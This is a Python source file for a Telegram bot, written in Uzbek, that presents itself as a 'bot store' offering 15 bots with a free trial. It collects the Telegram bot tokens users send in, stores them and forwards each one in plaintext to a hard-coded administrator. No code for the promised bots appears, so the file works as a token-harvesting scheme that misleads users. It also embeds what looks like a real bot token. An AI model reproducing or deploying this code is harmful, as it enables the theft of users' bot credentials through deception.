import sqlite3
import logging
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Logging sozlamalari
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# SIZNING MA'LUMOTLARINGIZ
TOKEN = "8666482660:AAHt8ocjlxgTIAbEJF3T1E5ABgT5ugJMNHw"
ADMIN_ID = 6639130930

# Database
def get_db():
    return sqlite3.connect('botstore.db', check_same_thread=False)

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, bot_type TEXT, 
                  bot_token TEXT, bot_username TEXT, start_date TEXT, end_date TEXT)''')
    conn.commit()
    conn.close()

init_db()

# 15 ta bot katalogi
BOTS = {
    "weather": {"name": "🌤 Ob-havo", "desc": "Har qanday shahar ob-havosi"},
    "currency": {"name": "💱 Valyuta", "desc": "150+ valyuta kurslari"},
    "translator": {"name": "🌍 Tarjimon", "desc": "100+ tilga tarjima"},
    "todo": {"name": "✅ Todo List", "desc": "Vazifalar ro'yxati"},
    "qr": {"name": "📱 QR Code", "desc": "QR kod yaratish"},
    "prayer": {"name": "🕌 Namoz", "desc": "Namoz vaqtlari"},
    "news": {"name": "📰 Yangiliklar", "desc": "So'nggi yangiliklar"},
    "calculator": {"name": "🔢 Kalkulyator", "desc": "Hisob-kitob"},
    "reminder": {"name": "⏰ Eslatma", "desc": "Eslatmalar tizimi"},
    "quiz": {"name": "🎮 Viktorina", "desc": "Bilim sinovlari"},
    "downloader": {"name": "📥 Yuklovchi", "desc": "Media yuklash"},
    "stats": {"name": "📊 Statistika", "desc": "Kanal analitikasi"},
    "moderator": {"name": "🛡 Moderator", "desc": "Guruh boshqaruvi"},
    "image_editor": {"name": "🖼 Rasm Editor", "desc": "Rasm tahrirlash"},
    "random": {"name": "🎲 Random", "desc": "Tasodifiy sonlar"}
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Foydalanuvchini saqlash
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, full_name) VALUES (?, ?, ?)",
              (user.id, user.username, user.full_name))
    conn.commit()
    conn.close()
    
    keyboard = [
        [InlineKeyboardButton("🛍 BOTLAR KATALOGI", callback_data="catalog")],
        [InlineKeyboardButton("📦 MENING BOTLARIM", callback_data="my_bots")],
        [InlineKeyboardButton("❓ YORDAM", callback_data="help")]
    ]
    
    await update.message.reply_text(
        f"🤖 *BOT STORE UZ*\n\n"
        f"Salom, {user.first_name}!\n\n"
        f"📦 15 ta professional bot\n"
        f"✅ 7 kun BEPUL sinov\n"
        f"💰 Keyin kuniga 300 so'm",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )
    logger.info(f"Start: {user.id}")

async def catalog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "🎯 *BOTLAR KATALOGI*\n\n7 kun BEPUL | 300 so'm/kun\n\n"
    text += "Botni tanlang:"
    
    keyboard = []
    for bot_id, bot in BOTS.items():
        keyboard.append([
            InlineKeyboardButton(f"{bot['name']} | 300 so'm", callback_data=f"info_{bot_id}")
        ])
    keyboard.append([InlineKeyboardButton("◀️ BOSH MENYU", callback_data="start_menu")])
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def bot_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    bot_id = query.data.replace("info_", "")
    bot = BOTS.get(bot_id)
    
    if not bot:
        return
    
    text = f"*{bot['name']}*\n\n📝 {bot['desc']}\n💰 300 so'm/kun\n🆓 7 kun BEPUL"
    
    keyboard = [
        [InlineKeyboardButton("🚀 7 KUN BEPUL FAOLSHTIRISH", callback_data=f"activate_{bot_id}")],
        [InlineKeyboardButton("◀️ KATALOGGA QAYTISH", callback_data="catalog")]
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def activate_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    bot_id = query.data.replace("activate_", "")
    bot = BOTS.get(bot_id, {"name": "Noma'lum"})
    
    context.user_data['activating'] = bot_id
    
    text = f"🔑 *{bot['name']}* ni faollashtirish\n\n"
    text += "1️⃣ @BotFather'ga o'ting\n"
    text += "2️⃣ /newbot buyrug'ini bering\n"
    text += "3️⃣ Bot yarating\n"
    text += "4️⃣ Olingan TOKENni shu yerga yuboring\n\n"
    text += "⚠️ Token namunasi:\n"
    text += "`1234567890:AAHdqTcvCHrT...`"
    
    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def receive_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'activating' not in context.user_data:
        return
    
    user_id = update.message.from_user.id
    token = update.message.text.strip()
    bot_id = context.user_data['activating']
    bot = BOTS.get(bot_id, {"name": "Noma'lum"})
    
    # Tokenni tekshirish
    try:
        test_bot = Bot(token=token)
        bot_info = await test_bot.get_me()
        
        # Bazaga saqlash
        conn = get_db()
        c = conn.cursor()
        
        start_date = datetime.now()
        end_date = start_date + timedelta(days=7)
        
        c.execute(
            "INSERT INTO subscriptions (user_id, bot_type, bot_token, bot_username, start_date, end_date) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, bot_id, token, bot_info.username, start_date.isoformat(), end_date.isoformat())
        )
        conn.commit()
        conn.close()
        
        del context.user_data['activating']
        
        # Admin'ga xabar
        try:
            await context.bot.send_message(
                ADMIN_ID,
                f"🆕 Yangi faollashtirish!\n"
                f"👤 User ID: {user_id}\n"
                f"🤖 Bot: {bot['name']}\n"
                f"🔑 Token: `{token}`\n"
                f"📅 Tugash: {end_date.strftime('%d.%m.%Y')}",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Admin xabari yuborilmadi: {e}")
        
        await update.message.reply_text(
            f"✅ *TABRIKLAYMIZ!*\n\n"
            f"🤖 Bot: @{bot_info.username}\n"
            f"📦 {bot['name']}\n"
            f"📅 Bepul: {end_date.strftime('%d.%m.%Y')} gacha\n"
            f"⏰ 7 kun BEPUL ishlaydi!\n\n"
            f"❓ Savollar bo'lsa: /start",
            parse_mode=ParseMode.MARKDOWN
        )
        
        logger.info(f"Bot faollashtirildi: User={user_id}, Bot={bot_id}")
        
    except Exception as e:
        error_msg = str(e)
        logger.error(f"Token xatosi: {error_msg}")
        
        await update.message.reply_text(
            "❌ *Token noto'g'ri!*\n\n"
            "Iltimos @BotFather'dan /newbot orqali yangi bot yarating va tokenini yuboring.\n\n"
            "Token namunasi: `1234567890:AAHdqTcvCHrT...`",
            parse_mode=ParseMode.MARKDOWN
        )

async def my_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM subscriptions WHERE user_id = ?", (user_id,))
    subs = c.fetchall()
    conn.close()
    
    if not subs:
        await query.edit_message_text(
            "📦 *Hali botlaringiz yo'q!*\n\n"
            "Katalogdan bot tanlang:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛍 KATALOGGA O'TISH", callback_data="catalog")]
            ])
        )
        return
    
    text = "📦 *MENING BOTLARIM*\n\n"
    keyboard = []
    
    for sub in subs:
        bot = BOTS.get(sub[2], {"name": "Noma'lum"})
        try:
            end_date = datetime.fromisoformat(sub[6])
            days_left = (end_date - datetime.now()).days
            text += f"✅ {bot['name']}\n"
            text += f"⏳ Qolgan kun: {max(0, days_left)}\n"
            text += f"🔗 @{sub[5]}\n\n"
        except:
            text += f"✅ {bot['name']}\n"
            text += f"🔗 @{sub[5]}\n\n"
    
    keyboard.append([InlineKeyboardButton("🛍 YANGI BOT OLISH", callback_data="catalog")])
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "❓ *YORDAM*\n\n"
    text += "1️⃣ Katalogdan bot tanlang\n"
    text += "2️⃣ @BotFather'dan token oling\n"
    text += "3️⃣ Tokenni botga yuboring\n"
    text += "4️⃣ Bot 7 kun BEPUL ishlaydi!\n\n"
    text += "📞 Admin: @yoldoshev_3"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ BOSH MENYU", callback_data="start_menu")]
        ]),
        parse_mode=ParseMode.MARKDOWN
    )

def main():
    logger.info("="*50)
    logger.info("BOT STORE UZ - Ishga tushmoqda...")
    logger.info(f"Token: {TOKEN[:15]}...")
    logger.info(f"Admin ID: {ADMIN_ID}")
    logger.info("="*50)
    
    # Application yaratish
    app = (
        Application.builder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .write_timeout(30)
        .build()
    )
    
    # Command handlerlar
    app.add_handler(CommandHandler("start", start))
    
    # Callback handlerlar
    app.add_handler(CallbackQueryHandler(catalog, pattern="^catalog$"))
    app.add_handler(CallbackQueryHandler(bot_info, pattern="^info_"))
    app.add_handler(CallbackQueryHandler(activate_bot, pattern="^activate_"))
    app.add_handler(CallbackQueryHandler(my_bots, pattern="^my_bots$"))
    app.add_handler(CallbackQueryHandler(help_menu, pattern="^help$"))
    app.add_handler(CallbackQueryHandler(start, pattern="^start_menu$"))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_token))
    
    logger.info("✅ Barcha handlerlar qo'shildi")
    logger.info("🚀 Bot ishga tushdi!")
    
    # Polling boshlash
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    main()
